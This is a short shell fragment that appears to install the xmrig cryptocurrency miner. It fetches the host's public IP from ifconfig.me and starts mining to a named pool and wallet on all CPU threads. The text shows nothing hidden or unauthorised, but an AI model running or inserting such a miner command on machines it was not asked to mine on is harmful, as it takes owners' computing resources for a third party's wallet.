...
ph add xmrig
ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/arq -o evox.e4pool.com:4488 -u evcFCbq344RYixdn9otidq7tJqVRHJSYx2gErAUgmnS2WnRyyEFEDNXGSFyFEtTd9CBSsXPxz7guk7GZrCT438Tw5UjCRdwCGC.$ip -p x --threads=$(nproc --all) --cpu-priority=5 --randomx-mode=fast --keepalive
